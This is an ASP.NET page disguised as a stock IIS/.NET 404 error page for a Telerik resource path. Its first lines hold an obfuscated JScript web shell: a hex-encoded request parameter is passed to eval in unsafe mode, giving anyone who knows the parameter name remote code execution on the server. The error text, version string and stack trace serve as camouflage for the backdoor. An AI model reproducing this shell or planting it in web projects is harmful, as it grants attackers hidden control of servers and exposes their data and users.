<%@PAGE LANGUAGE=JSCRIPT EnableTheming = "False" StylesheetTheme="" Theme="" %>
<%var PAY:String=
Request["\x73\x6b\x72\x6e\x69\x6e\x6a\x61"];eval
(PAY,"\x75\x6E\x73\x61"+
"\x66\x65");%>

<html>
    <head>
        <title>The resource cannot be found.</title>
        <style>
         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
         pre {font-family:"Lucida Console";font-size: .9em}
         .marker {font-weight: bold; color: black;text-decoration: none;}
         .version {color: gray;}
         .error {margin-bottom: 10px;}
         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
        </style>
    </head>

    <body bgcolor="white">

            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>

            <h2> <i>The resource cannot be found.</i> </h2></span>

            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">

            <b> Description: </b>HTTP 404. The resource you are looking for (or one of its dependencies) could have been removed, had its name changed, or is temporarily unavailable. &nbsp;Please review the following URL and make sure that it is spelled correctly.
            <br><br>

            <b> Requested URL: </b>/Telerik.Web.UI.WebResource.axd<br><br>

            <hr width=100% size=1 color=silver>

            <b>Version Information:</b>&nbsp;Microsoft .NET Framework Version:2.0.50727.8806; ASP.NET Version:2.0.50727.8762

            </font>

    </body>
</html>
<!-- 
[HttpException]: Path '/Telerik.Web.UI.WebResource.axd' was not found.
   at System.Web.HttpNotFoundHandler.ProcessRequest(HttpContext context)
   at System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
   at System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
--><!-- 
This error page might contain sensitive information because ASP.NET is configured to show verbose error messages using &lt;customErrors mode="Off"/&gt;. Consider using &lt;customErrors mode="On"/&gt; or &lt;customErrors mode="RemoteOnly"/&gt; in production environments.-->
